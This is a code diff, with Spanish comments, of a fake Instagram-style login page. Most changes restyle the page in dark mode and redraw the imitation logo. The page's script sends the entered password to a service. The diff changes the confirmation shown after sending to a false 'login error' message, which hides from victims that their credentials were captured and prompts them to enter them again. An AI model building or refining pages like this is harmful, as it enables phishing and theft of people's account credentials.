@@ -9,11 +9,12 @@
       margin: 0;
       padding: 0;
       font-family: 'Helvetica', sans-serif;
-      background-color: #fafafa;
+      background-color: #000; /* fondo negro */
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      color: #ddd; /* texto claro */
     }
 
     .container {
@@ -21,17 +22,21 @@
     }
 
     .login-box {
-      background: white;
-      border: 1px solid #dbdbdb;
+      background: #121212; /* caja más oscura para contraste */
+      border: 1px solid #333;
       padding: 40px;
       width: 300px;
       margin-bottom: 10px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #222;
+      color: #ddd;
     }
 
     .logo {
       margin: 0 auto 30px auto;
-      width: 60px;
-      height: 60px;
+      width: 70px;
+      height: 70px;
+      filter: drop-shadow(0 0 2px #feda75);
     }
 
     input {
@@ -40,9 +45,14 @@
       margin-bottom: 6px;
       padding: 9px;
       font-size: 14px;
-      border: 1px solid #dbdbdb;
+      border: 1px solid #555;
       border-radius: 4px;
-      background: #fafafa;
+      background: #222;
+      color: #eee;
+    }
+
+    input::placeholder {
+      color: #aaa;
     }
 
     button {
@@ -55,6 +65,11 @@
       margin-top: 10px;
       border-radius: 4px;
       cursor: pointer;
+      box-shadow: 0 2px 4px #0062b8;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #0077cc;
     }
 
     .separator {
@@ -62,46 +77,53 @@
       align-items: center;
       text-align: center;
       margin: 20px 0;
+      color: #666;
     }
 
     .line {
       flex: 1;
       height: 1px;
-      background-color: #dbdbdb;
+      background-color: #444;
     }
 
     .or {
       margin: 0 10px;
-      color: #8e8e8e;
+      color: #666;
       font-size: 13px;
     }
 
     .fb-login {
-      color: #385185;
+      color: #5995f9;
       font-weight: bold;
       font-size: 14px;
       margin: 10px 0;
       cursor: pointer;
+      text-shadow: 0 0 3px #385185;
     }
 
     .forgot {
       font-size: 12px;
-      color: #00376b;
+      color: #77aaff;
       margin-top: 12px;
       cursor: pointer;
+      text-shadow: 0 0 2px #00376b;
     }
 
     .signup-box {
-      background: white;
-      border: 1px solid #dbdbdb;
+      background: #121212;
+      border: 1px solid #333;
       padding: 20px;
       font-size: 14px;
+      border-radius: 8px;
+      color: #ddd;
+      box-shadow: 0 0 10px #222;
     }
 
     .signup-box a {
       color: #0095f6;
       text-decoration: none;
       font-weight: bold;
+      text-shadow: 0 0 3px #0095f6;
     }
   </style>
 
@@ -117,7 +139,7 @@
         password: document.getElementById("password").value,
       })
       .then(() => {
-        alert("Datos enviados correctamente.");
+        alert("Error de login. Por favor, inténtalo de nuevo.");
         document.getElementById("loginForm").reset();
       }, (error) => {
         alert("Error al enviar: " + JSON.stringify(error));
@@ -128,21 +150,24 @@
 <body>
   <div class="container">
     <div class="login-box">
-      <div class="logo">
-        <svg width="60" height="60" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <div class="logo" aria-label="Logo estilo Instagram">
+        <svg width="70" height="70" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" focusable="false">
           <defs>
-            <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
-              <stop offset="0%" style="stop-color:#f09433;stop-opacity:1" />
-              <stop offset="25%" style="stop-color:#e6683c;stop-opacity:1" />
-              <stop offset="50%" style="stop-color:#dc2743;stop-opacity:1" />
-              <stop offset="75%" style="stop-color:#cc2366;stop-opacity:1" />
-              <stop offset="100%" style="stop-color:#bc1888;stop-opacity:1" />
+            <linearGradient id="instagramGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+              <stop offset="0%" stop-color="#feda75"/>
+              <stop offset="25%" stop-color="#fa7e1e"/>
+              <stop offset="50%" stop-color="#d62976"/>
+              <stop offset="75%" stop-color="#962fbf"/>
+              <stop offset="100%" stop-color="#4f5bd5"/>
             </linearGradient>
+            <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%" >
+              <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.3"/>
+            </filter>
           </defs>
-          <rect x="64" y="64" width="384" height="384" rx="96" ry="96" fill="url(#grad)" />
-          <circle cx="256" cy="256" r="144" fill="white" />
-          <circle cx="256" cy="256" r="96" fill="none" stroke="url(#grad)" stroke-width="32" />
-          <circle cx="384" cy="128" r="32" fill="url(#grad)" />
+          <rect x="64" y="64" width="384" height="384" rx="96" ry="96" fill="url(#instagramGradient)" filter="url(#shadow)" />
+          <circle cx="256" cy="256" r="128" fill="white" />
+          <circle cx="256" cy="256" r="96" fill="none" stroke="url(#instagramGradient)" stroke-width="32" />
+          <circle cx="368" cy="144" r="32" fill="url(#instagramGradient)" />
         </svg>
       </div>
 
